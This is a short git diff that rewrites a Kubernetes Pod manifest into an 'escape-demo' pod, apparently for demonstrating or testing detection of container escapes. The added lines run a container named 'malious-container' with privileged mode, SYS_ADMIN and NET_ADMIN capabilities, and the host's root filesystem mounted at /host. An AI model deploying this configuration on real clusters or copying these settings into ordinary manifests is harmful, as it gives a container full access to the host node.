@@ -1,15 +1,24 @@
+# Simple YAML manifest for a Alpine Pod with Prviledges to do an escape to host
 apiVersion: v1
 kind: Pod
 metadata:
-  creationTimestamp: null
+  name: escape-demo
   labels:
-    run: test
-  name: test
+    app: escape-demo
 spec:
   containers:
-  - image: hreed014/cdr-xsiam-pc:1.0.2
-    name: test
-    resources: {}
-  dnsPolicy: ClusterFirst
-  restartPolicy: Always
-status: {}
+    - name: malious-container
+      image: alpine 
+      securityContext:
+        privileged: true
+        capabilities:
+          add:
+            - SYS_ADMIN
+            - NET_ADMIN
+      volumeMounts:
+        - name: host
+          mountPath: /host
+  volumes:
+    - name: host
+      hostPath:
+        path: /
